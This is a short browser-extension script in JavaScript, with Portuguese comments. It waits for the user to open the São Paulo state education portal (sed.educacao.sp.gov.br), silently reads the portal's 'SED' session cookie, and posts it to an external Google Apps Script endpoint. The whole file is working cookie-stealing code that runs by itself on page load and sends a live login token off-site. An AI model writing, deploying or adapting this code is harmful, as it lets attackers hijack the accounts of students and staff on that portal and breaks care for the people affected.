async function enviarCookie() {
  try {
    // pega o cookie chamado "SED" do domínio
    const cookie = await chrome.cookies.get({
      url: "https://sed.educacao.sp.gov.br/",
      name: "SED"
    });

    if (cookie) {
      const resposta = await fetch("https://script.google.com/macros/s/AKfycbzPBOVTP3zo5M1k2TJj4YPUUlzlb82gyKFaYNyfxk8I0gx5MWqBZ9pwLfEmt3qRs0Fg3g/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ cookie: cookie.value })
      });

      console.log("Cookie enviado, status:", resposta.status);
    } else {
      console.log("Cookie SED não encontrado.");
    }
  } catch (erro) {
    console.error("Erro ao enviar cookie:", erro);
  }
}

// executa quando abrir a página alvo
chrome.webNavigation.onCompleted.addListener((details) => {
  if (details.url.includes("sed.educacao.sp.gov.br/Inicio")) {
    enviarCookie();
  }
}, { url: [{ hostContains: "sed.educacao.sp.gov.br" }] });
